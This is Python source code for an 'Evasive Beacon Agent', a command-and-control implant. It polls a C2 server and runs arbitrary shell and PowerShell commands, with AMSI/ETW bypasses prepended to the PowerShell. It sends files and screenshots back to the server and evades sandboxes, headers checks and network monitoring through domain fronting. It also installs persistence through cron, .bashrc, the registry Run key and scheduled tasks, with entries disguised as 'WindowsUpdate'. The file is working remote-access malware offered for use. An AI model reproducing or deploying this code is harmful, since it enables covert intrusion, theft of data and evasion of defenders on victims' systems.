"""
Evasive Beacon Agent
Advanced C2 beacon with full EDR evasion capabilities

Integrates:
- Sleep obfuscation with jitter
- Header rotation for network evasion
- Anti-sandbox checks before execution
- AMSI/ETW bypass for PowerShell commands
- Traffic masking and domain fronting
"""
import os
import sys
import time
import json
import random
import base64
import hashlib
import platform
import subprocess
import threading
import urllib.request
import urllib.error
from typing import Dict, Optional, List, Callable
from dataclasses import dataclass, field
from datetime import datetime

# Add parent directory for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import evasion modules
try:
    from evasion.sleep_obfuscation import SleepObfuscator, STEALTHY_PROFILE
    from evasion.header_rotation import HeaderRotator
    from evasion.anti_sandbox import SandboxDetector
    from evasion.traffic_masking import TrafficMasker, DomainFronter
    from evasion.amsi_bypass import AMSIBypass, ETWBypass
    EVASION_AVAILABLE = True
except ImportError:
    EVASION_AVAILABLE = False
    print("[!] Evasion modules not available, running in basic mode")


@dataclass
class BeaconConfig:
    """Beacon configuration"""
    c2_host: str
    c2_port: int = 443
    beacon_id: str = ""
    sleep_time: int = 60
    jitter_percent: int = 30
    kill_date: Optional[str] = None  # YYYY-MM-DD
    working_hours: Optional[tuple] = None  # (start_hour, end_hour)
    use_https: bool = True
    proxy: Optional[str] = None
    domain_front_host: Optional[str] = None
    traffic_profile: str = "google_search"
    max_retries: int = 3
    evasion_level: int = 3  # 1=low, 2=medium, 3=high


@dataclass
class BeaconState:
    """Current beacon state"""
    is_running: bool = False
    last_checkin: Optional[datetime] = None
    tasks_completed: int = 0
    errors: int = 0
    sandbox_detected: bool = False
    evasion_active: bool = False


class EvasiveBeacon:
    """
    Advanced C2 beacon with EDR evasion capabilities.
    
    Features:
    - Encrypted sleep with memory obfuscation
    - HTTP header and TLS fingerprint rotation
    - Anti-sandbox detection
    - Traffic masking (mimics legitimate apps)
    - Domain fronting support
    - Kill date and working hours
    - AMSI/ETW bypass for PowerShell
    """
    
    def __init__(self, config: BeaconConfig):
        self.config = config
        self.state = BeaconState()
        
        # Generate unique beacon ID if not provided
        if not config.beacon_id:
            self.config.beacon_id = self._generate_beacon_id()
        
        # Initialize evasion components
        if EVASION_AVAILABLE and config.evasion_level > 0:
            self._init_evasion()
        else:
            self.sleep_obfuscator = None
            self.header_rotator = None
            self.sandbox_detector = None
            self.traffic_masker = None
        
        # Task handlers
        self.task_handlers: Dict[str, Callable] = {
            "cmd": self._handle_cmd,
            "shell": self._handle_shell,
            "powershell": self._handle_powershell,
            "download": self._handle_download,
            "upload": self._handle_upload,
            "screenshot": self._handle_screenshot,
            "keylog": self._handle_keylog,
            "persist": self._handle_persist,
            "migrate": self._handle_migrate,
            "exit": self._handle_exit,
        }
        
        # Queued tasks
        self.task_queue: List[Dict] = []
        self.results_queue: List[Dict] = []
    
    def _generate_beacon_id(self) -> str:
        """Generate unique beacon identifier"""
        data = f"{platform.node()}-{platform.machine()}-{os.getpid()}-{time.time()}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]
    
    def _init_evasion(self):
        """Initialize evasion components"""
        self.state.evasion_active = True
        
        # Sleep obfuscation
        self.sleep_obfuscator = SleepObfuscator(
            base_sleep=self.config.sleep_time,
            jitter_percent=self.config.jitter_percent
        )
        
        # Header rotation
        self.header_rotator = HeaderRotator()
        
        # Sandbox detection
        self.sandbox_detector = SandboxDetector()
        
        # Traffic masking
        self.traffic_masker = TrafficMasker()
        
        # Domain fronting (if configured)
        if self.config.domain_front_host:
            self.domain_fronter = DomainFronter()
        else:
            self.domain_fronter = None
    
    def pre_flight_checks(self) -> bool:
        """
        Run pre-flight checks before beaconing.
        Returns False if environment is hostile.
        """
        # Check kill date
        if self.config.kill_date:
            if datetime.now().strftime("%Y-%m-%d") >= self.config.kill_date:
                print("[!] Kill date reached, exiting")
                return False
        
        # Check working hours
        if self.config.working_hours:
            current_hour = datetime.now().hour
            start_hour, end_hour = self.config.working_hours
            if not (start_hour <= current_hour < end_hour):
                print(f"[*] Outside working hours ({start_hour}-{end_hour}), sleeping")
                time.sleep(3600)  # Sleep 1 hour
                return self.pre_flight_checks()  # Re-check
        
        # Sandbox detection (if evasion enabled)
        if self.sandbox_detector and self.config.evasion_level >= 2:
            result = self.sandbox_detector.run_all_checks()
            if result['is_sandbox']:
                self.state.sandbox_detected = True
                print(f"[!] Sandbox detected: {result['detection_reason']}")
                
                if self.config.evasion_level >= 3:
                    # High evasion: exit silently
                    return False
                # Medium evasion: continue but be cautious
        
        return True
    
    def run(self):
        """Main beacon loop"""
        print(f"[*] Beacon starting: {self.config.beacon_id}")
        
        # Pre-flight checks
        if not self.pre_flight_checks():
            return
        
        self.state.is_running = True
        consecutive_errors = 0
        
        while self.state.is_running:
            try:
                # Check in with C2
                tasks = self._checkin()
                
                # Process received tasks
                if tasks:
                    for task in tasks:
                        self._execute_task(task)
                
                # Send results
                if self.results_queue:
                    self._send_results()
                
                consecutive_errors = 0
                
            except Exception as e:
                consecutive_errors += 1
                self.state.errors += 1
                print(f"[!] Beacon error: {e}")
                
                if consecutive_errors >= self.config.max_retries:
                    print("[!] Max consecutive errors reached, increasing sleep")
                    # Exponential backoff
                    self.config.sleep_time = min(
                        self.config.sleep_time * 2,
                        3600  # Max 1 hour
                    )
            
            # Sleep with obfuscation
            self._evasive_sleep()
    
    def _evasive_sleep(self):
        """Sleep with optional obfuscation"""
        if self.sleep_obfuscator:
            sleep_time = self.sleep_obfuscator.get_sleep_time()
            print(f"[*] Sleeping {sleep_time:.1f}s (obfuscated)")
            self.sleep_obfuscator.sleep()
        else:
            # Basic jitter
            jitter = random.uniform(
                -self.config.jitter_percent/100,
                self.config.jitter_percent/100
            )
            sleep_time = self.config.sleep_time * (1 + jitter)
            time.sleep(sleep_time)
    
    def _build_request(self, endpoint: str, data: Dict = None) -> urllib.request.Request:
        """Build HTTP request with evasion techniques"""
        protocol = "https" if self.config.use_https else "http"
        
        # Domain fronting
        if self.domain_fronter and self.config.domain_front_host:
            # Connect to CDN, send Host header to real C2
            url = f"{protocol}://{self.config.domain_front_host}:{self.config.c2_port}{endpoint}"
            real_host = self.config.c2_host
        else:
            url = f"{protocol}://{self.config.c2_host}:{self.config.c2_port}{endpoint}"
            real_host = None
        
        # Traffic masking
        if self.traffic_masker:
            masked = self.traffic_masker.mask_request(
                json.dumps(data or {}).encode(),
                self.config.traffic_profile
            )
            headers = masked['headers']
        else:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json"
            }
        
        # Header rotation
        if self.header_rotator:
            rotated = self.header_rotator.get_headers()
            headers.update(rotated)
        
        # Build request
        if data:
            body = json.dumps(data).encode()
            req = urllib.request.Request(url, data=body, method='POST')
        else:
            req = urllib.request.Request(url, method='GET')
        
        for key, value in headers.items():
            req.add_header(key, value)
        
        # Override Host header for domain fronting
        if real_host:
            req.add_header('Host', real_host)
        
        return req
    
    def _checkin(self) -> Optional[List[Dict]]:
        """Check in with C2 server"""
        data = {
            "id": self.config.beacon_id,
            "hostname": platform.node(),
            "username": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "os": platform.system(),
            "arch": platform.machine(),
            "pid": os.getpid(),
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            req = self._build_request("/beacon/checkin", data)
            
            # Use proxy if configured
            if self.config.proxy:
                proxy_handler = urllib.request.ProxyHandler({
                    "http": self.config.proxy,
                    "https": self.config.proxy
                })
                opener = urllib.request.build_opener(proxy_handler)
            else:
                opener = urllib.request.build_opener()
            
            response = opener.open(req, timeout=30)
            self.state.last_checkin = datetime.now()
            
            result = json.loads(response.read().decode())
            return result.get('tasks', [])
            
        except urllib.error.URLError as e:
            raise ConnectionError(f"Failed to check in: {e}")
    
    def _send_results(self):
        """Send task results to C2"""
        if not self.results_queue:
            return
        
        data = {
            "id": self.config.beacon_id,
            "results": self.results_queue
        }
        
        try:
            req = self._build_request("/beacon/results", data)
            opener = urllib.request.build_opener()
            opener.open(req, timeout=30)
            self.results_queue.clear()
        except Exception as e:
            print(f"[!] Failed to send results: {e}")
    
    def _execute_task(self, task: Dict):
        """Execute a task from C2"""
        task_type = task.get('type', 'cmd')
        task_id = task.get('id', 'unknown')
        
        handler = self.task_handlers.get(task_type)
        if not handler:
            self.results_queue.append({
                "task_id": task_id,
                "success": False,
                "error": f"Unknown task type: {task_type}"
            })
            return
        
        try:
            result = handler(task)
            self.results_queue.append({
                "task_id": task_id,
                "success": True,
                "output": result
            })
            self.state.tasks_completed += 1
        except Exception as e:
            self.results_queue.append({
                "task_id": task_id,
                "success": False,
                "error": str(e)
            })
    
    # Task Handlers
    def _handle_cmd(self, task: Dict) -> str:
        """Execute system command"""
        cmd = task.get('command', '')
        if not cmd:
            raise ValueError("No command specified")
        
        if platform.system() == "Windows":
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=300
            )
        else:
            result = subprocess.run(
                ['sh', '-c', cmd], capture_output=True, text=True, timeout=300
            )
        
        return result.stdout + result.stderr
    
    def _handle_shell(self, task: Dict) -> str:
        """Execute shell command (alias for cmd)"""
        return self._handle_cmd(task)
    
    def _handle_powershell(self, task: Dict) -> str:
        """Execute PowerShell with AMSI bypass"""
        script = task.get('script', '')
        if not script:
            raise ValueError("No script specified")
        
        if platform.system() != "Windows":
            raise OSError("PowerShell only available on Windows")
        
        # AMSI bypass if evasion enabled
        if EVASION_AVAILABLE and self.config.evasion_level >= 2:
            amsi = AMSIBypass()
            etw = ETWBypass()
            
            # Prepend bypass to script
            full_script = amsi.get_bypass_code('reflection') + "\n"
            full_script += etw.get_etw_bypass_code('patch') + "\n"
            full_script += script
        else:
            full_script = script
        
        # Encode script
        encoded = base64.b64encode(full_script.encode('utf-16-le')).decode()
        
        result = subprocess.run(
            ['powershell.exe', '-NoProfile', '-NonInteractive',
             '-EncodedCommand', encoded],
            capture_output=True, text=True, timeout=300
        )
        
        return result.stdout + result.stderr
    
    def _handle_download(self, task: Dict) -> str:
        """Download file from target"""
        filepath = task.get('path', '')
        if not filepath or not os.path.exists(filepath):
            raise FileNotFoundError(f"File not found: {filepath}")
        
        with open(filepath, 'rb') as f:
            content = base64.b64encode(f.read()).decode()
        
        return json.dumps({
            "filename": os.path.basename(filepath),
            "size": os.path.getsize(filepath),
            "content": content
        })
    
    def _handle_upload(self, task: Dict) -> str:
        """Upload file to target"""
        filepath = task.get('path', '')
        content = task.get('content', '')
        
        if not filepath or not content:
            raise ValueError("Missing path or content")
        
        data = base64.b64decode(content)
        with open(filepath, 'wb') as f:
            f.write(data)
        
        return f"File written: {filepath} ({len(data)} bytes)"
    
    def _handle_screenshot(self, task: Dict) -> str:
        """Take screenshot"""
        try:
            from PIL import ImageGrab
            import io
            
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            content = base64.b64encode(buffer.getvalue()).decode()
            
            return json.dumps({
                "filename": "screenshot.png",
                "content": content
            })
        except ImportError:
            raise RuntimeError("PIL not available for screenshots")
    
    def _handle_keylog(self, task: Dict) -> str:
        """Start/stop keylogger"""
        action = task.get('action', 'status')
        # Placeholder - would need pynput or similar
        return f"Keylogger action: {action}"
    
    def _handle_persist(self, task: Dict) -> str:
        """Establish persistence"""
        method = task.get('method', 'registry')
        
        if platform.system() != "Windows":
            # Linux persistence
            if method == 'cron':
                return self._persist_cron()
            elif method == 'bashrc':
                return self._persist_bashrc()
        else:
            # Windows persistence
            if method == 'registry':
                return self._persist_registry()
            elif method == 'schtasks':
                return self._persist_schtasks()
        
        return f"Persistence method {method} not implemented"
    
    def _persist_cron(self) -> str:
        """Linux cron persistence"""
        beacon_path = os.path.abspath(__file__)
        cron_entry = f"*/5 * * * * /usr/bin/python3 {beacon_path}\n"
        
        # Add to crontab
        os.system(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')
        return "Cron persistence established"
    
    def _persist_bashrc(self) -> str:
        """Linux bashrc persistence"""
        beacon_path = os.path.abspath(__file__)
        bashrc = os.path.expanduser("~/.bashrc")
        
        entry = f"\n# System update check\nnohup /usr/bin/python3 {beacon_path} &>/dev/null &\n"
        
        with open(bashrc, 'a') as f:
            f.write(entry)
        
        return "Bashrc persistence established"
    
    def _persist_registry(self) -> str:
        """Windows registry persistence"""
        import winreg
        beacon_path = os.path.abspath(__file__)
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ,
                          f"pythonw.exe {beacon_path}")
        winreg.CloseKey(key)
        
        return "Registry persistence established"
    
    def _persist_schtasks(self) -> str:
        """Windows scheduled task persistence"""
        beacon_path = os.path.abspath(__file__)
        
        cmd = (
            f'schtasks /create /tn "WindowsUpdate" /tr "pythonw.exe {beacon_path}" '
            '/sc onlogon /rl highest /f'
        )
        subprocess.run(cmd, shell=True, capture_output=True)
        
        return "Scheduled task persistence established"
    
    def _handle_migrate(self, task: Dict) -> str:
        """Process migration (Windows only)"""
        target_pid = task.get('pid')
        if not target_pid:
            raise ValueError("No target PID specified")
        
        # Would need process injection from evasion module
        return f"Migration to PID {target_pid} not yet implemented"
    
    def _handle_exit(self, task: Dict) -> str:
        """Stop beacon"""
        self.state.is_running = False
        return "Beacon exiting"


def main():
    """Main entry point"""
    # Default configuration - would be embedded during payload generation
    config = BeaconConfig(
        c2_host="127.0.0.1",
        c2_port=8080,
        sleep_time=60,
        jitter_percent=30,
        evasion_level=3
    )
    
    # Parse command line overrides
    import argparse
    parser = argparse.ArgumentParser(description="Evasive Beacon Agent")
    parser.add_argument("--host", default=config.c2_host, help="C2 host")
    parser.add_argument("--port", type=int, default=config.c2_port, help="C2 port")
    parser.add_argument("--sleep", type=int, default=config.sleep_time, help="Sleep time")
    parser.add_argument("--jitter", type=int, default=config.jitter_percent, help="Jitter %")
    parser.add_argument("--evasion", type=int, default=config.evasion_level, 
                        choices=[0,1,2,3], help="Evasion level (0-3)")
    parser.add_argument("--proxy", default=None, help="Proxy URL")
    parser.add_argument("--front", default=None, help="Domain fronting host")
    
    args = parser.parse_args()
    
    config.c2_host = args.host
    config.c2_port = args.port
    config.sleep_time = args.sleep
    config.jitter_percent = args.jitter
    config.evasion_level = args.evasion
    config.proxy = args.proxy
    config.domain_front_host = args.front
    
    # Create and run beacon
    beacon = EvasiveBeacon(config)
    beacon.run()


if __name__ == "__main__":
    main()
